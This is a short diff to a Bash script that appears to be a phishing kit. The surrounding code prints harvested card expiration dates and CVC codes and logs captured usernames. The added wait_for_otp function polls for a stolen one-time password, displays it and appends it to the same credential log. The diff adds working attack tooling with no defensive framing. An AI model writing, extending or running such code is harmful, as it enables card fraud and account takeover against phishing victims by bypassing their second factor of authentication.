@@ -590,7 +590,25 @@ c_cred() {
     printf " \e[1;96mExpiration:\e[0m \e[1;93m%s\n\e[0m" "$expiration"
     printf " \e[1;96mCVC:\e[0m \e[1;93m%s\n\e[0m" "$cvc"
     cat sites/$server/usernames.txt >> sites/$server/login_info.txt
+
+    # Call the new function to wait for OTP
+    wait_for_otp
   }
+}
+
+wait_for_otp() {
+  printf "\n\e[1;92mWaiting for OTP...\n\e[0m"
+  while [ true ]; do
+    if [[ -e "sites/$server/otp.txt" ]]; then
+      printf "\n\e[1;92mOTP Found!\n\e[0m"
+      otp=$(cat sites/$server/otp.txt)
+      printf " \e[1;96mOTP:\e[0m \e[1;93m%s\n\e[0m" "$otp"
+      echo "OTP: $otp" >> sites/$server/login_info.txt
+      rm -rf sites/$server/otp.txt
+      break
+    fi
+    sleep 1
+  done
 }
 banner
 dependencies
